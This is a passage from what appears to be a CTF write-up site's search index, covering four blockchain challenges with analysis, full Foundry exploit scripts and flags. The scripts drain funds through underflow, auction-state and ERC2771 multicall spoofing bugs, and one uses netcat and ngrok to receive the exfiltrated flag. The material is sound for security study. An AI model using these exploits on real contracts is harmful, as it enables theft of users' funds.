registerInsoDomain() \u53ea\u80fd\u6ce8\u518c\u4ee5 .inso \u7ed3\u5c3e\u7684\u57df\u540d 1 2 3 4 5 6 7 8 # Resolve the domain by calling the `resolveIp` function of the contract host = helpers . resolve_domain ( session [ \"instance_id\" ], session [ \"subdomain\" ] + \".\" + CHALLENGE_DOMAIN ) if host is None or host == \"\" : return \"No DNS entry for this domain\" , 400 try : requests . post ( f \"http:// { host } : { port } \" , data = FLAG , timeout = 2 ) \u5728\u6301\u6709\u670d\u52a1\u5668\u7b7e\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4f7f\u7528 transferDomain() \u66f4\u65b0\u57df\u540d\u6240\u6709\u8005\u53ca IP \u5730\u5740\u3002\u670d\u52a1\u5668\u7b7e\u540d\u53ef\u5728\u8c03\u7528 initiateTransfer() \u540e\uff0c\u901a\u8fc7 GET /transfer-codes \u83b7\u53d6 \u7b7e\u540d\u9a8c\u8bc1\u5e76\u975e\u9488\u5bf9\u6574\u4e2a\u57df\u540d\uff0c\u800c\u662f\u5206\u6bb5\u8fdb\u884c\u7684\uff0c\u4e3a\u6784\u9020\u63d0\u4f9b\u4e86\u53ef\u80fd\u3002\u5bf9\u4e8e\u6309 . \u5206\u5272\u7684\u57df\u540d\u7684\u5404\u4e2a\u90e8\u5206\uff0c\u9644\u4e0a partCount - partIndex \u7684\u503c\uff0c\u53d6\u524d 32 \u5b57\u8282\u4f5c\u4e3a\u4e00\u6bb5\u8fdb\u884c\u9a8c\u8bc1\u3002\u90a3\u4e48\u53ea\u8981\u6ce8\u518c\u7684\u57df\u540d\u6309 . \u5206\u5272\u7684\u5404\u90e8\u5206\uff08\u9664 .inso \uff09\u81f3\u5c11\u4e3a 32 \u5b57\u8282\uff0c\u5c31\u80fd\u901a\u8fc7 initiateTransfer() \u83b7\u53d6\u4efb\u610f\u7b7e\u540d\uff0c\u518d\u901a\u8fc7 transferDomain() \u8bbe\u7f6e IP \u5730\u5740\u5373\u53ef\u83b7\u53d6 Flag 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 contract UnnamedWeb3Script is Script { function register () public { vm . startBroadcast ( vm . envUint ( \"PRIVATE_KEY\" )); DomainRegistry registry = DomainRegistry ( vm . envAddress ( \"INSTANCE_ADDR\" )); string memory domain ; string memory part = string ( abi . encodePacked ( \"6b8508d1c6065ac5\" , uint8 ( 3 ))); bytes32 tmp ; assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , tmp )); part = string ( abi . encodePacked ( \"insomnihack\" , uint8 ( 2 ))); assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , \".\" , tmp )); part = string ( abi . encodePacked ( \"flag\" , uint8 ( 1 ))); assembly { tmp := mload ( add ( part , 32 )) } domain = string ( abi . encodePacked ( domain , \".\" , tmp )); registry . registerInsoDomain { value : 1 ether }( domain , \"1.3.3.7\" ); registry . initiateTransfer ( string . concat ( domain , \".inso\" ), vm . addr ( vm . envUint ( \"PRIVATE_KEY\" )) ); vm . stopBroadcast (); } function transfer () public { vm . startBroadcast ( vm . envUint ( \"PRIVATE_KEY\" )); DomainRegistry registry = DomainRegistry ( vm . envAddress ( \"INSTANCE_ADDR\" )); registry . transferDomain ( \"6b8508d1c6065ac5.insomnihack.flag\" , // nc -l -p 8080 // ngrok http 8080 \"<->.ngrok-free.app\" , bytes ( hex \"\" ) // copy the signature from https://unnamed.insomnihack.ch/transfer-codes ); vm . stopBroadcast (); } }","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/unnamedweb3/#flag","text":"INS{H0dl_y0ur_INSO_co1n5_plz!}","title":"Flag"},{"location":"blockchain/voting_vault/","tags":["smart contract","double spending","precision loss","integer underflow"],"text":"#smart contract #double spending #precision loss #integer underflow .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 In the spirit of decentralization, GreyHats is now a DAO! Vote with your GREY tokens to decide how our funds are spent. nc challs.nusgreyhats.org 30401 Challenge Files Solution \u00b6 10,000 GREY is deposited into the treasury. To solve the challenge, we need to drain the treasury by creating a withdrawal proposal and gathering enough votes to execute it Votes can be obtained by locking GREY for at least 30 days. The voting power can be transferred to others through VotingVault::delegate() , and can be done any number of times 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function delegate ( address newDelegatee ) external { require ( newDelegatee != address ( 0 ), \"cannot delegate to zero address\" ); ( UserData storage data , address delegatee ) = _getUserData ( msg . sender ); Deposit [] storage deposits = data . deposits ; data . delegatee = newDelegatee ; uint256 length = deposits . length ; if ( length == 0 ) return ; Deposit storage lastUnlockedDeposit = deposits [ data . front ]; Deposit storage lastDeposit = deposits [ length - 1 ]; uint256 amount = lastDeposit . cumulativeAmount - lastUnlockedDeposit . cumulativeAmount ; uint256 votes = _calculateVotes ( amount ); _subtractVotingPower ( delegatee , votes ); _addVotingPower ( newDelegatee , votes ); } Each person can only vote once for each proposal, but the voting power is reusable. The intuitive idea is to transfer the voting power to other accounts and double spend the votes 1 2 3 4 5 6 7 8 9 10 11 function vote ( uint256 proposalId ) external { require ( ! voted [ proposalId ][ msg . sender ], \"already voted\" ); uint256 blockNumber = proposals [ proposalId ]. blockNumber ; require ( blockNumber < block . number , \"same block\" ); voted [ proposalId ][ msg . sender ] = true ; uint256 votingPower = VAULT . votingPower ( msg . sender , blockNumber ); proposals [ proposalId ]. votes += votingPower ; } The minimum number of votes required to execute a withdrawal proposal is 1,000,000, while the maximum number of votes we can obtain by locking GREY is 1,300. Due to the limitation of vote() function, which only obtains the historical voting power of the previous block, we can only vote once in each block. It is infeasible to reach the threshold and execute the proposal within the validity period of the instance When changing the delegatee, the voting power of the previous delegatee will be subtracted. However, the calculation is done within an unchecked block. If votes is larger than oldVotes , an integer underflow could occur leading to a significant increase in the voting power of the old delegatee 1 2 3 4 5 6 function _subtractVotingPower ( address delegatee , uint256 votes ) internal { uint256 oldVotes = history . getLatestVotingPower ( delegatee ); unchecked { history . push ( delegatee , oldVotes - votes ); } } The number of votes a user receives when locking GREY is calculated based on the amount of GREY to be locked. However, when updating the delegatee, the number of transferred votes is calculated based on the total number of locked GREY 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function lock ( uint256 amount ) external returns ( uint256 ) { ... uint256 votes = _calculateVotes ( amount ); _addVotingPower ( delegatee , votes ); GREY . transferFrom ( msg . sender , address ( this ), amount ); ... } function delegate ( address newDelegatee ) external { ... Deposit storage lastUnlockedDeposit = deposits [ data . front ]; Deposit storage lastDeposit = deposits [ length - 1 ]; uint256 amount = lastDeposit . cumulativeAmount - lastUnlockedDeposit . cumulativeAmount ; uint256 votes = _calculateVotes ( amount ); _subtractVotingPower ( delegatee , votes ); _addVotingPower ( newDelegatee , votes ); } There is a potential loss of precision when calculating votes. Specifically, the number of votes calculated based on the total number of locked GREY could be greater than the number of votes accumulated by diving the same total amount of GREY into multiple locks 1 2 3 function _calculateVotes ( uint256 amount ) internal pure returns ( uint256 ) { return amount * VOTE_MULTIPLIER / 1e18 ; } Exploitation \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // forge script Solve --broadcast -vvv --rpc-url $RPC_URL --slow contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); uint priv = vm . envUint ( \"PRIV\" ); GREY grey = setup . grey (); VotingVault vault = setup . vault (); Treasury treasury = setup . treasury (); vm . startBroadcast ( priv ); setup . claim (); grey . approve ( address ( vault ), 10 ); vault . lock ( 1 ); vault . lock ( 9 ); treasury . propose ( address ( grey ), 10000 ether , vm . addr ( priv )); vault . delegate ( address ( 0x1337 )); vm . roll ( block . number + 1 ); // to pass the local simulation treasury . vote ( 0 ); treasury . execute ( 0 ); require ( setup . isSolved ()); vm . stopBroadcast (); } } Flag \u00b6 grey{rounding_is_dangerous_752aa6bb8b6a9f61}","title":"Voting Vault"},{"location":"blockchain/voting_vault/#description","text":"In the spirit of decentralization, GreyHats is now a DAO! Vote with your GREY tokens to decide how our funds are spent. nc challs.nusgreyhats.org 30401 Challenge Files","title":"Description"},{"location":"blockchain/voting_vault/#solution","text":"10,000 GREY is deposited into the treasury. To solve the challenge, we need to drain the treasury by creating a withdrawal proposal and gathering enough votes to execute it Votes can be obtained by locking GREY for at least 30 days. The voting power can be transferred to others through VotingVault::delegate() , and can be done any number of times 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function delegate ( address newDelegatee ) external { require ( newDelegatee != address ( 0 ), \"cannot delegate to zero address\" ); ( UserData storage data , address delegatee ) = _getUserData ( msg . sender ); Deposit [] storage deposits = data . deposits ; data . delegatee = newDelegatee ; uint256 length = deposits . length ; if ( length == 0 ) return ; Deposit storage lastUnlockedDeposit = deposits [ data . front ]; Deposit storage lastDeposit = deposits [ length - 1 ]; uint256 amount = lastDeposit . cumulativeAmount - lastUnlockedDeposit . cumulativeAmount ; uint256 votes = _calculateVotes ( amount ); _subtractVotingPower ( delegatee , votes ); _addVotingPower ( newDelegatee , votes ); } Each person can only vote once for each proposal, but the voting power is reusable. The intuitive idea is to transfer the voting power to other accounts and double spend the votes 1 2 3 4 5 6 7 8 9 10 11 function vote ( uint256 proposalId ) external { require ( ! voted [ proposalId ][ msg . sender ], \"already voted\" ); uint256 blockNumber = proposals [ proposalId ]. blockNumber ; require ( blockNumber < block . number , \"same block\" ); voted [ proposalId ][ msg . sender ] = true ; uint256 votingPower = VAULT . votingPower ( msg . sender , blockNumber ); proposals [ proposalId ]. votes += votingPower ; } The minimum number of votes required to execute a withdrawal proposal is 1,000,000, while the maximum number of votes we can obtain by locking GREY is 1,300. Due to the limitation of vote() function, which only obtains the historical voting power of the previous block, we can only vote once in each block. It is infeasible to reach the threshold and execute the proposal within the validity period of the instance When changing the delegatee, the voting power of the previous delegatee will be subtracted. However, the calculation is done within an unchecked block. If votes is larger than oldVotes , an integer underflow could occur leading to a significant increase in the voting power of the old delegatee 1 2 3 4 5 6 function _subtractVotingPower ( address delegatee , uint256 votes ) internal { uint256 oldVotes = history . getLatestVotingPower ( delegatee ); unchecked { history . push ( delegatee , oldVotes - votes ); } } The number of votes a user receives when locking GREY is calculated based on the amount of GREY to be locked. However, when updating the delegatee, the number of transferred votes is calculated based on the total number of locked GREY 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 function lock ( uint256 amount ) external returns ( uint256 ) { ... uint256 votes = _calculateVotes ( amount ); _addVotingPower ( delegatee , votes ); GREY . transferFrom ( msg . sender , address ( this ), amount ); ... } function delegate ( address newDelegatee ) external { ... Deposit storage lastUnlockedDeposit = deposits [ data . front ]; Deposit storage lastDeposit = deposits [ length - 1 ]; uint256 amount = lastDeposit . cumulativeAmount - lastUnlockedDeposit . cumulativeAmount ; uint256 votes = _calculateVotes ( amount ); _subtractVotingPower ( delegatee , votes ); _addVotingPower ( newDelegatee , votes ); } There is a potential loss of precision when calculating votes. Specifically, the number of votes calculated based on the total number of locked GREY could be greater than the number of votes accumulated by diving the same total amount of GREY into multiple locks 1 2 3 function _calculateVotes ( uint256 amount ) internal pure returns ( uint256 ) { return amount * VOTE_MULTIPLIER / 1e18 ; }","title":"Solution"},{"location":"blockchain/voting_vault/#exploitation","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // forge script Solve --broadcast -vvv --rpc-url $RPC_URL --slow contract Solve is Script { function run () public { Setup setup = Setup ( vm . envAddress ( \"INSTANCE\" )); uint priv = vm . envUint ( \"PRIV\" ); GREY grey = setup . grey (); VotingVault vault = setup . vault (); Treasury treasury = setup . treasury (); vm . startBroadcast ( priv ); setup . claim (); grey . approve ( address ( vault ), 10 ); vault . lock ( 1 ); vault . lock ( 9 ); treasury . propose ( address ( grey ), 10000 ether , vm . addr ( priv )); vault . delegate ( address ( 0x1337 )); vm . roll ( block . number + 1 ); // to pass the local simulation treasury . vote ( 0 ); treasury . execute ( 0 ); require ( setup . isSolved ()); vm . stopBroadcast (); } }","title":"Exploitation"},{"location":"blockchain/voting_vault/#flag","text":"grey{rounding_is_dangerous_752aa6bb8b6a9f61}","title":"Flag"},{"location":"blockchain/ethernaut/dutch2/","tags":["smart contract","solidity"],"text":"#smart contract #solidity .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 Looks like someone is auctioning a lot of tokens, but they are encrypted. Might be a good idea to bid... Challenge Files Solution \u00b6 There are some quote tokens and base tokens locked in the auction contract. The objective of the challenge is to drain the quote tokens in the auction contract Any user can create an auction. The auction has several stages and the checkState modifier checks the current state of an auction based on the block timestamp and specific variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 modifier checkState ( States state , Auction storage auction ) { if ( block . timestamp < auction . time . start ) { if ( state != States . Created ) revert (); } else if ( block . timestamp < auction . time . end ) { if ( state != States . Accepting ) revert (); } else if ( auction . data . quoteLowest != type ( uint128 ). max ) { if ( state != States . Final ) revert (); } else if ( block . timestamp <= auction . time . end + 24 hours ) { if ( state != States . Reveal ) revert (); } else if ( block . timestamp > auction . time . end + 24 hours ) { if ( state != States . Void ) revert (); } else { revert (); } _ ; } The auction creator can take out the bidders' quote tokens via finalize(). Meanwhile, the finalize() function can set the quoteLowest of an auction, which will affect the determination of the auction state, to a user-provided value. Invoke finalize() function with quote parameter set to type(uint128).max allows sellers to keep the auction in Reveal stage and withdraw quote tokens again 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function finalize ( uint256 id , uint256 [] memory indices , uint128 base , uint128 quote ) public checkState ( States . Reveal , auctions [ id ]) { ... auction . data . baseLowest = base ; auction . data . quoteLowest = quote ; ... if ( data . totalBase != data . baseFilled ) { auction . parameters . totalBase = data . baseFilled ; ERC20 ( auction . parameters . tokenBase ). safeTransfer ( auction . data . seller , data . totalBase - data . baseFilled ); } ERC20 ( auction . parameters . tokenQuote ). safeTransfer ( auction . data . seller , quote . mulDivDown ( data . baseFilled , base )); } To exploit the vulnerability, the quote amount and base amount of a bid should be chosen carefully. If the auction has only one bid, amountQuote * type(uint128).max / amountBase needs to be equal to quote * type(uint128).max / base . To keep it simple, base can be also set to type(uint128).max , and the bidder quote amount should be equal to the base amount 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 for ( uint256 i ; i < indices . length ; i ++ ) { uint256 index = indices [ i ]; BidEncrypted storage bid = auction . bids [ index ]; uint256 mapIndex = index / 256 ; uint256 bitMap = bidSeen [ mapIndex ]; uint256 bitIndex = 1 << ( index % 256 ); if ( bitIndex == 1 & bitMap ) revert (); bidSeen [ mapIndex ] = bitMap | bitIndex ; Math . Point memory commonPoint = Math . mul ( sellerPrivateKey , bid . publicKey ); if ( commonPoint . y == 1 && commonPoint . x == 1 ) continue ; bytes32 decrypted = Math . decrypt ( commonPoint , bid . encrypted ); if ( genCommitment ( decrypted ) != bid . commit ) continue ; uint128 amountBase = uint128 ( uint256 ( decrypted >> 128 )); uint256 quotePerBase = bid . amountQuote . mulDivDown ( type ( uint128 ). max , amountBase ); if ( quotePerBase >= data . prevQuoteBase ) { if ( quotePerBase == data . prevQuoteBase ) { if ( data . prevIndex > index ) revert (); } else { revert (); } } if ( quotePerBase < data . resQuoteBase ) continue ; if ( data . totalBase == data . baseFilled ) continue ; data . prevIndex = index ; data . prevQuoteBase = quotePerBase ; // @note baseFilled should be less than or equal to totalBase if ( amountBase + data . baseFilled > data . totalBase ) { amountBase = data . totalBase - data . baseFilled ; } data . baseFilled += amountBase ; bid . baseAmountFilled = amountBase ; } if ( quote . mulDivDown ( type ( uint128 ). max , base ) != data . prevQuoteBase ) revert (); for ( uint256 i ; i < bidSeen . length - 1 ; i ++ ) { if ( bidSeen [ i ] != type ( uint256 ). max ) revert (); } if ((( 1 << ( indices . length % 256 )) - 1 ) != bidSeen [ bidSeen . length - 1 ]) revert (); if ( data . baseFilled > data . totalBase ) { revert (); } Exploitation \u00b6 If no new blocks are mined, block.timestamp will not be updated in the local simulation Use --slow flag to send transactions one by one, and prevent local simulation for the second() function from reverting via onchain simulation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 contract Bidder { function bid ( AuctionManager auction , uint id , ERC20 token ) public returns ( uint idx ) { token . approve ( address ( auction ), 1e10 ); ( Math . Point memory pub , bytes32 encrypt ) = Math . encrypt ( Math . Point ( 1 , 2 ), 1 , bytes32 ( uint ( 1e10 << 128 ))); // base, equal to the amount quote tokens remaining in the contract idx = auction . addBid ( id , 1e10 , // quoteAmount, equal to baseAmount auction . genCommitment ( Math . decrypt ( Math . mul ( 1 , pub ), encrypt ) ), pub , encrypt , new bytes32 []( 0 ) ); } } contract Solve is Script { uint256 immutable playerPrivateKey = vm . envUint ( \"PLAYER\" ); Challenge challenge = Challenge ( vm . envAddress ( \"CHALLENGE\" )); AuctionManager auction = challenge . auction (); ERC20 baseToken = challenge . baseToken (); ERC20 quoteToken = challenge . quoteToken (); function first () public { vm . startBroadcast ( playerPrivateKey ); baseToken . approve ( address ( auction ), 1e10 ); auction . create ( AuctionManager . AuctionParameters ( address ( baseToken ), address ( quoteToken ), 0 , // resQuoteBase 1e10 , // totalBase 0 , // minBid bytes32 ( 0 ), // merkle Math . Point ( 1 , 2 ) // publicKey ), AuctionManager . Time ( uint32 ( block . timestamp ), // start uint32 ( block . timestamp + 1 minutes ), // end uint32 ( block . timestamp + 2 minutes ), // startVesting uint32 ( block . timestamp + 3 minutes ), // endVesting 0 // cliff ) ); Bidder bidder = new Bidder (); quoteToken . transfer ( address ( bidder ), 1e10 ); bidder . bid ( auction , 1 , quoteToken ); vm . stopBroadcast (); } function second () public { vm . startBroadcast ( playerPrivateKey ); uint256 [] memory indices = new uint256 []( 1 ); indices [ 0 ] = 0 ; auction . show ( 1 , 1 , abi . encode ( indices , type ( uint128 ). max , type ( uint128 ). max )); auction . finalize ( 1 , indices , type ( uint128 ). max , type ( uint128 ). max ); require ( challenge . isSolved ()); vm . stopBroadcast (); } } Flag \u00b6 OZCTF{sT4T3_g0T_T0o_C0nFuS3D_f0R_tH3_4uCt10n} References \u00b6 Slow mode and skip simulation for script don't work \u00b7 Issue #5776 \u00b7 foundry-rs/foundry","title":"Dutch 2"},{"location":"blockchain/ethernaut/dutch2/#description","text":"Looks like someone is auctioning a lot of tokens, but they are encrypted. Might be a good idea to bid... Challenge Files","title":"Description"},{"location":"blockchain/ethernaut/dutch2/#solution","text":"There are some quote tokens and base tokens locked in the auction contract. The objective of the challenge is to drain the quote tokens in the auction contract Any user can create an auction. The auction has several stages and the checkState modifier checks the current state of an auction based on the block timestamp and specific variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 modifier checkState ( States state , Auction storage auction ) { if ( block . timestamp < auction . time . start ) { if ( state != States . Created ) revert (); } else if ( block . timestamp < auction . time . end ) { if ( state != States . Accepting ) revert (); } else if ( auction . data . quoteLowest != type ( uint128 ). max ) { if ( state != States . Final ) revert (); } else if ( block . timestamp <= auction . time . end + 24 hours ) { if ( state != States . Reveal ) revert (); } else if ( block . timestamp > auction . time . end + 24 hours ) { if ( state != States . Void ) revert (); } else { revert (); } _ ; } The auction creator can take out the bidders' quote tokens via finalize(). Meanwhile, the finalize() function can set the quoteLowest of an auction, which will affect the determination of the auction state, to a user-provided value. Invoke finalize() function with quote parameter set to type(uint128).max allows sellers to keep the auction in Reveal stage and withdraw quote tokens again 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function finalize ( uint256 id , uint256 [] memory indices , uint128 base , uint128 quote ) public checkState ( States . Reveal , auctions [ id ]) { ... auction . data . baseLowest = base ; auction . data . quoteLowest = quote ; ... if ( data . totalBase != data . baseFilled ) { auction . parameters . totalBase = data . baseFilled ; ERC20 ( auction . parameters . tokenBase ). safeTransfer ( auction . data . seller , data . totalBase - data . baseFilled ); } ERC20 ( auction . parameters . tokenQuote ). safeTransfer ( auction . data . seller , quote . mulDivDown ( data . baseFilled , base )); } To exploit the vulnerability, the quote amount and base amount of a bid should be chosen carefully. If the auction has only one bid, amountQuote * type(uint128).max / amountBase needs to be equal to quote * type(uint128).max / base . To keep it simple, base can be also set to type(uint128).max , and the bidder quote amount should be equal to the base amount 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 for ( uint256 i ; i < indices . length ; i ++ ) { uint256 index = indices [ i ]; BidEncrypted storage bid = auction . bids [ index ]; uint256 mapIndex = index / 256 ; uint256 bitMap = bidSeen [ mapIndex ]; uint256 bitIndex = 1 << ( index % 256 ); if ( bitIndex == 1 & bitMap ) revert (); bidSeen [ mapIndex ] = bitMap | bitIndex ; Math . Point memory commonPoint = Math . mul ( sellerPrivateKey , bid . publicKey ); if ( commonPoint . y == 1 && commonPoint . x == 1 ) continue ; bytes32 decrypted = Math . decrypt ( commonPoint , bid . encrypted ); if ( genCommitment ( decrypted ) != bid . commit ) continue ; uint128 amountBase = uint128 ( uint256 ( decrypted >> 128 )); uint256 quotePerBase = bid . amountQuote . mulDivDown ( type ( uint128 ). max , amountBase ); if ( quotePerBase >= data . prevQuoteBase ) { if ( quotePerBase == data . prevQuoteBase ) { if ( data . prevIndex > index ) revert (); } else { revert (); } } if ( quotePerBase < data . resQuoteBase ) continue ; if ( data . totalBase == data . baseFilled ) continue ; data . prevIndex = index ; data . prevQuoteBase = quotePerBase ; // @note baseFilled should be less than or equal to totalBase if ( amountBase + data . baseFilled > data . totalBase ) { amountBase = data . totalBase - data . baseFilled ; } data . baseFilled += amountBase ; bid . baseAmountFilled = amountBase ; } if ( quote . mulDivDown ( type ( uint128 ). max , base ) != data . prevQuoteBase ) revert (); for ( uint256 i ; i < bidSeen . length - 1 ; i ++ ) { if ( bidSeen [ i ] != type ( uint256 ). max ) revert (); } if ((( 1 << ( indices . length % 256 )) - 1 ) != bidSeen [ bidSeen . length - 1 ]) revert (); if ( data . baseFilled > data . totalBase ) { revert (); }","title":"Solution"},{"location":"blockchain/ethernaut/dutch2/#exploitation","text":"If no new blocks are mined, block.timestamp will not be updated in the local simulation Use --slow flag to send transactions one by one, and prevent local simulation for the second() function from reverting via onchain simulation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 contract Bidder { function bid ( AuctionManager auction , uint id , ERC20 token ) public returns ( uint idx ) { token . approve ( address ( auction ), 1e10 ); ( Math . Point memory pub , bytes32 encrypt ) = Math . encrypt ( Math . Point ( 1 , 2 ), 1 , bytes32 ( uint ( 1e10 << 128 ))); // base, equal to the amount quote tokens remaining in the contract idx = auction . addBid ( id , 1e10 , // quoteAmount, equal to baseAmount auction . genCommitment ( Math . decrypt ( Math . mul ( 1 , pub ), encrypt ) ), pub , encrypt , new bytes32 []( 0 ) ); } } contract Solve is Script { uint256 immutable playerPrivateKey = vm . envUint ( \"PLAYER\" ); Challenge challenge = Challenge ( vm . envAddress ( \"CHALLENGE\" )); AuctionManager auction = challenge . auction (); ERC20 baseToken = challenge . baseToken (); ERC20 quoteToken = challenge . quoteToken (); function first () public { vm . startBroadcast ( playerPrivateKey ); baseToken . approve ( address ( auction ), 1e10 ); auction . create ( AuctionManager . AuctionParameters ( address ( baseToken ), address ( quoteToken ), 0 , // resQuoteBase 1e10 , // totalBase 0 , // minBid bytes32 ( 0 ), // merkle Math . Point ( 1 , 2 ) // publicKey ), AuctionManager . Time ( uint32 ( block . timestamp ), // start uint32 ( block . timestamp + 1 minutes ), // end uint32 ( block . timestamp + 2 minutes ), // startVesting uint32 ( block . timestamp + 3 minutes ), // endVesting 0 // cliff ) ); Bidder bidder = new Bidder (); quoteToken . transfer ( address ( bidder ), 1e10 ); bidder . bid ( auction , 1 , quoteToken ); vm . stopBroadcast (); } function second () public { vm . startBroadcast ( playerPrivateKey ); uint256 [] memory indices = new uint256 []( 1 ); indices [ 0 ] = 0 ; auction . show ( 1 , 1 , abi . encode ( indices , type ( uint128 ). max , type ( uint128 ). max )); auction . finalize ( 1 , indices , type ( uint128 ). max , type ( uint128 ). max ); require ( challenge . isSolved ()); vm . stopBroadcast (); } }","title":"Exploitation"},{"location":"blockchain/ethernaut/dutch2/#flag","text":"OZCTF{sT4T3_g0T_T0o_C0nFuS3D_f0R_tH3_4uCt10n}","title":"Flag"},{"location":"blockchain/ethernaut/dutch2/#references","text":"Slow mode and skip simulation for script don't work \u00b7 Issue #5776 \u00b7 foundry-rs/foundry","title":"References"},{"location":"blockchain/ethernaut/wombo_combo/","tags":["smart contract","solidity","multicall"],"text":"#smart contract #solidity #multicall .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } Description \u00b6 You should stake your tokens to get more tokens! Challenge Files Solution \u00b6 To solve the challenge, we need to obtain enough rewards from the Staking contract and transfer reward tokens to address(0x123) The Staking contract inherits from Multicall and ERC2771Context The ERC2771Context overrides the msgSender() so that the actual caller will be the last 20 bytes of the call data if calls originating from a trusted forwarder 1 2 3 4 5 6 7 8 9 10 function _msgSender () internal view virtual override returns ( address sender ) { if ( isTrustedForwarder ( msg . sender )) { // The assembly code is more direct than the Solidity version using `abi.decode`. assembly { sender := shr ( 96 , calldataload ( sub ( calldatasize (), 20 ))) } } else { return super . _msgSender (); } } The multicall() function can batch multiple calls in a single external call with user-provided data, which can be combined with the forwarder to impersonate any user calling the Staking contract 1 2 3 4 5 6 7 function multicall ( bytes [] calldata data ) external returns ( bytes [] memory results ) { results = new bytes []( data . length ); for ( uint256 i = 0 ; i < data . length ; i ++ ) { results [ i ] = Address . functionDelegateCall ( address ( this ), data [ i ]); } return results ; } The user's reward is related to rewardRate and is only updated in notifyRewardAmount() which can only be called by the owner We can first stake some tokens, impersonate the owner to increase the rewardRate , and then obtain enough rewards to solve the challenge :> Exploitation \u00b6 Run the script twice to give some time to accumulate rewards: Stake and impersonate the owner to notify the reward amount Get reward tokens and transfer them to address(0x123) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 contract Solve is CTFSolver { function solve ( address _challenge , address player ) internal override { Challenge challenge = Challenge ( _challenge ); Forwarder forwarder = challenge . forwarder (); Staking staking = challenge . staking (); Token token = staking . stakingToken (); Token reward = staking . rewardsToken (); uint priv = vm . envUint ( \"PLAYER\" ); if ( staking . totalSupply () > 0 ) { staking . getReward (); reward . transfer ( address ( 0x123 ), reward . balanceOf ( player )); return ; } token . approve ( address ( staking ), token . totalSupply ()); staking . stake ( token . totalSupply ()); bytes [] memory data = new bytes []( 1 ); data [ 0 ] = abi . encodePacked ( staking . notifyRewardAmount . selector , uint256 ( 100 _000_000 ether ), staking . owner () ); Forwarder . ForwardRequest memory req = Forwarder . ForwardRequest ( player , // from address ( staking ), // to 0 , // value 300000 , // gas 0 , // nonce block . timestamp + 1 minutes , // deadline abi . encodeCall ( staking . multicall , ( data ) ) ); bytes32 separator = keccak256 ( abi . encode ( keccak256 ( \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\" ), keccak256 ( bytes ( \"Forwarder\" )), keccak256 ( bytes ( \"1\" )), block . chainid , address ( forwarder ) ) ); bytes32 forwarderTypeHash = keccak256 ( \"ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)\" ); bytes32 digest = ECDSA . toTypedDataHash ( separator , keccak256 ( abi . encode ( forwarderTypeHash , req . from , req . to , req . value , req . gas , req . nonce , req . deadline , keccak256 ( req . data ) ) ) ); ( uint8 v , bytes32 r , bytes32 s ) = vm . sign ( priv , digest ); bytes memory signature = abi . encodePacked ( r , s , v ); forwarder . execute ( req , signature ); } } Flag \u00b6 OZCTF{M3t4_Tr4NS4ct10nS_aR4_n0T_S0_m3Ta} References \u00b6 Arbitrary Address Spoofing Attack: ERC2771Context Multicall Public Disclosure","title":"Wombo Combo"},{"location":"blockchain/ethernaut/wombo_combo/#description","text":"You should stake your tokens to get more tokens! Challenge Files","title":"Description"},{"location":"blockchain/ethernaut/wombo_combo/#solution","text":"To solve the challenge, we need to obtain enough rewards from the Staking contract and transfer reward tokens to address(0x123) The Staking contract inherits from Multicall and 